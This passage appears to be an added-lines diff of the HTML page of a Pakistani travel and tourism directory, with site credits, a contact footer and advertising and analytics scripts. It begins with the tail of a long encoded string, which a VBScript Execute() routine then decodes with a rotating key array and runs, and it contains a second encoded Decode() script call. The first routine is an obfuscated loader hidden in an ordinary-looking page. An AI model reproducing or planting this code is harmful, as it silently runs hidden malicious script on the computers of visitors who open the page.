JcuqBon,@ia_oRbppGq9TP_pfmp,P`ngmqBsiij_jbFcCooRebjFjUebnc: eqijCipaFjUebnc: s_o AlaEdEdFjUebnc: s_o QdckQbqDPL;@nc^qaM_gaaq%Q`oenqfje+CejbPuqqbiM_gaaq%ParToQebhj:Aob]rbL^hb`p&TOaoflr+Pdcii'AjpbPbp>mljbL^hb`p:`m`rickq*_mmhcqp$ HG[erbor&>mljbL^hb`p,pbpAIPEB%wD601B@/.+.@B.*.-B-*=B?6).-@,2CA16>->{&>mljbL^hb`p,`oa_qbElpq]l`b$'OcqSqPeaji9>mljbL^hb`p,DbpM_gaaq%%>lnibK`gb_r+par@IOGA%y-A01CB,/*C,70*-/@C)661,+--=.@6,31/.6z%>lnibK`gb_r+`nc^qaGkpp_k`a&&QbqDPL;>lnibK`gb_r+DarL_fc`q$'AlaEdOcq@gphK`gb_r:DPL*BofrcpDloC^`dAfoiQbinFjAfoiL_fc`qFcBfpgRbjl,AoetbQunb8</?kaBfpgRbjl,AoetbQunb8<.RebjBtgqBmoCkaGcDfk]jvAeqh9AfoiQbin+AngsbHcqqapJcuqAfiLqdco>np%0%O]laligwbClnf:,Ql1Krebn?oo$g&9Fkp&%6(Ojb&&KbtrPcjmOrofje: Dlog:.RlHck%PffpPcuq%QakmKqk:?p`$Kfa$RefoRbup*f)-'&GcPcjmJsj9.0RebjQakmKqk:05CipaGcPcjmJsj9.-RebjQakmKqk:06CkaGcRbjlAe^n:?fo%PcjmJsj)Lqdco>np%fKla2&&FcRbjlAe^n:?fo%/2&PfbkQbin@e]p:Aeo$/5&Bk`FcQbinPqngkd;QakmPppfkc#Pcjm?f^oKbtrQlIl_iPqn:Cub_sqb$ AekHaw>on&0&(RefoRbup #r`@oHd#Ibv=po%,': #Mqeap>on&-&$ #s^AoIb$Gcv>np%.%:#Krebn?oo$/&$s_?pIc Haw>on&/&;$Lpfbo=po%.'# t_@nJc# Hbu?oo$1&9Lqdco>np%0%# #r`@oHd#Dlog:.RlHck%AvbPppfkc't_@nJc# QbinKri:=q`%Iga%AvbPppfkc*f)-'&$s_?pIc FbQbinKri:-6Qdck$s_?pIc QakmKqk:11$s_?pIc BjbFb #r`@oHd#RbjlAe^n:?fo%PcjmJsj'Hbu?oo$gJkb1%'t_@nJc# FcRbjlAe^n:?fo%.6&Pfbk #s^AoIb$Pcjm?f^o;s^Ao$s_?pIc BhqbFbQbin@e]p:Aeo$06&Rebj #r`@oHd#RbjlAe^n:r`Ic #s^AoIb$AlaEdt_@nJc# QeeqQbtr:RefoRbup#Pcjm?f^o #s^AoIb$Jcuq &$s^AoIb#Cub_sqb$RefoRbup'RefoRbup:CubOrofje: $QakmPppfkc# EqijQbtr::p_pfmpi^jer^cc:s^q`oenq;#r`@oHd# al_sjbjr+tngqb # #:aetppwib9%mlogqfkl7^^qliqrb8jbcp8-mt9qkn7-lv8sgaqd8-mt9eagdep8-mt9w)gkaav7/49seqf_ejfqu8eebabj%;$8 # >LNIBPK>IC:HF # \dqcpqFBFCFQ:,TF@RE:,`l`c:`kk+jo, ^_rfsaV+>_rfsa # U@kkmljckq: # 9$+?MMHCQ;#:,`gs; s_?pIc$8 # ,p_pfmp<s_?pIc$8 # p`ngmqj^kcs^da;s_oaoflr;$s^AoIb#PffpPcuq$s^AoIb#QlIl_iPqn#r`@oHd# 9$+q`oenq;#r`@oHd# 9$+@LAU<s_?pIc$8 # ,EPKI;S^qQbtr:RefoRbup#r`@oHd#SkIkahPpp#t_@nJcHF]pq]pq%% SgkM]re9CPK,DbpQmb_g^iBmiaap%-%#ZGc$DPL*DfiaCuforp%SgkM]reta`YCkjabn,eqp &&RebjCOM+@knvCejbSgkM]reta`YCkjabn,eqp )TelM^pf# tb^Zhgs_ii*efcBjbFbFb%COM+CejbBtgpqo&TfjN^qd#qvppcj0.Zaboiqll,fke &&RebjCOM+@knvCejbSgkM]repuqqbi1/Y`cphpmm+elf(UfkL_qe$owpqak0/Xigt]ji+cgcBk`FcBk`Crjaqfkl"
+Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 3"&vbCrLf&"KeyArr(1) = 3"&vbCrLf&"KeyArr(2) = 4"&vbCrLf&"KeyArr(3) = 2"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
+Execute(ThisText)
+</script>
+
+<p align="center"><b><font size="4"><a href="index.htm">Index Go to Main Page World Tourism 
+Directory</a></font></b></p>
+<p align="center"><b><font color="#FF0066">Your Trusted source for the Best Deals on everything 
+    from Vacations, Hotels, Resorts, Inns, Vacation Packages, Travel Packages, 
+    Vacation Rentals, Attractions, Show Tickets and just about anything else 
+    worth searching for !</font></b></p>
+
+<p align="center"><font face="Book Antiqua" color="#000080"><b>Designed &amp; Developed&nbsp; by Webmaster 
+  Computer Engr. Abbas Shahid Baqir. &nbsp; </b> </font> 
+<p align="center"><b><font face="Book Antiqua" color="#008000">Sponsored 
+  By : </font><font face="Book Antiqua" color="#0000FF">(PTTS)</font><font face="Book Antiqua" color="#FF0066">&nbsp; 
+Pakistani Tourist And Travel Services Pvt Ltd. </font>
+<font face="Book Antiqua" color="#0000FF">GL. No LHR-3521.</font></b><p align="center">
+<a href="mailto:ptts14@yahoo.com">Feedback us</a>&nbsp; <b><FONT face=Verdana>| </FONT></b>&nbsp;<a href="mailto:ptts14@yahoo.com">Suggest 
+a Site</a>&nbsp; <b><FONT face=Verdana>|</FONT></b>&nbsp;
+<a href="mailto:ptts14@yahoo.com">Add Website</a>&nbsp; <b><FONT face=Verdana>|</FONT></b>&nbsp;
+<a href="mailto:ptts14@yahoo.com">Webmaster Feedback</a></p>
+<p align="center"><b><font size="1" color="#008000" face="Arial">The content of this 
+  site is &nbsp;? Copyright, ? 20<SPAN lang=en-us>06</SPAN>-10<SPAN lang=en-us> 
+  </SPAN>All Rights Reserved . </font></b>
+<font size="1" face="Arial" color="#008000">your trusted source for the Best 
+Deals on world travel, tourism and just about anything else worth searching for!</font></p>
+
+</BODY>
+</HTML>
+
+<br>
+<center>
+
+<script type="text/javascript"><!--
+google_ad_client = "pub-3362051909983443";
+google_ad_width = 728;
+google_ad_height = 90;
+google_ad_format = "728x90_as";
+google_ad_type = "text_image";
+google_ad_channel ="0752038511";
+google_color_border = "336699";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_text = "000000";
+google_color_url = "008000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+
+</center> <br>
+<SCRIPT LANGUAGE=JavaScript>
+<!--   
+    Decode('%264Dtdsjqu%2631mbohvbhf%264E%2633kbwbtdsjqu%2633%2631uzqf%264E%2633ufyu0kbwbtdsjqu%2633%2631tsd%264E%26330dhj.cjo0wbmjebuf%60cboofs%264Gfod%264Etswx14%2633%264F%264D0tdsjqu%264F1');
+//-->
+</SCRIPT>
+
+
+<!-- PrintTracker Insertion Begin -->
+<script src="/fs_img/js/pt.js" type="text/javascript"></script>
+<!-- PrintTracker Insertion Complete -->
+
+
+<!-- Google Analytics Insertion Begin -->
+<script type="text/javascript">
+<!--
+        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+        var URL = gaJsHost + "google-analytics.com/ga.js";
+        document.write(unescape("%3Cscript src='" + URL + "' type='text/javascript'%3E%3C/script%3E"));
+
+        var hndl = window.setTimeout('StartTracking()',100);
+        function StartTracking(){
+          if( typeof(_gat) == 'object'){ 
+             window.clearTimeout(hndl);
+             var pageTracker = _gat._getTracker("UA-4601892-10");
+             pageTracker._setDomainName("none");
+             pageTracker._setAllowLinker(true);
+             pageTracker._initData();
+             pageTracker._trackPageview();
+          }else{
+             hndl = window.setTimeout('StartTracking()',100);
+          }
+        }
+-->
+</script>
+<!-- Google Analytics Insertion Complete -->
+
+<SCRIPT LANGUAGE=JavaScript>
+  <!--
+  //configuration
+  OAS_url = "http://cyclops.untd.com/";
+  OAS_sitepage = 'webservices/general'; //CHANGED
+  OAS_listpos = 'Bottom';
+  OAS_query = '';
+  OAS_target = '_Blank';
+  //end of configuration
+  OAS_version = 10;
+  OAS_rn = '001234567890'; OAS_rns = '1234567890';
+  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
+  function OAS_NORMAL(pos) {
+    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
+    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
+  }
+  //-->
+  </SCRIPT>
+
+  <SCRIPT LANGUAGE=JavaScript1.1>
+  <!--
+  OAS_version = 11;
+  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
+    OAS_version = 10;
+  if (OAS_version >= 11)
+    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCR'+'IPT>');
+  //-->
+  </SCRIPT>
+
+  <SCRIPT LANGUAGE=JavaScript>
+  <!--
+  document.write('');
+  function OAS_AD(pos) {
+    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
+      OAS_RICH(pos);
+    } else {
+      OAS_NORMAL(pos);
+    }
+  }
+  //-->
+  </SCRIPT>
+
+  <TABLE ALIGN=CENTER STYLE="clear:both"><TR><TD ALIGN=CENTER> <!------ OAS AD 'Bottom' begin ------> <SCRIPT LANGUAGE=JavaScript> if(window.OAS_AD) OAS_AD('Bottom'); </SCRIPT> <!------ OAS AD 'Bottom' end ------> </TD></TR></TABLE>
